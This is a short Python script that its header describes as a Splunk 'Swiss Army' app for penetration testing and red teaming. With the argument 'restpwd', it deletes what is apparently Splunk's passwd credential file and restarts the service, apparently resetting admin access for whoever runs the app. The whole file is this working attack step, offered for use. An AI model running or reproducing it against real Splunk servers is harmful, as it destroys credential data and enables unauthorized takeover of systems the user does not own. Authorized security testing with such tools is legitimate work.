#!/usr/bin/env python


#**************************************************************************#
#  Filename: swissarmy.py               (Created: 2016-10-02)              #
#                                       (Updated: xxxx-xx-xx)              #
#  Info:                                                                   #
#    TBG Security Splunk Swiss Army App. Used for penetration testing and  #
#       and Red Teaming.                                                   #
#                                                                          #
#  Author:                                                                 #
#    Ryan Hays                                                             #
#**************************************************************************#


import subprocess
import sys

try:
    SPLUNKCMD = sys.argv[1]
except IndexError:
    sys.exit(1)


if __name__ == "__main__":
    if SPLUNKCMD.lower() == 'restpwd':
        subprocess.Popen(["rm", "-f", "../../../passwd",]).wait()
        subprocess.Popen(["../../../../bin/splunk", "restart"]).wait()
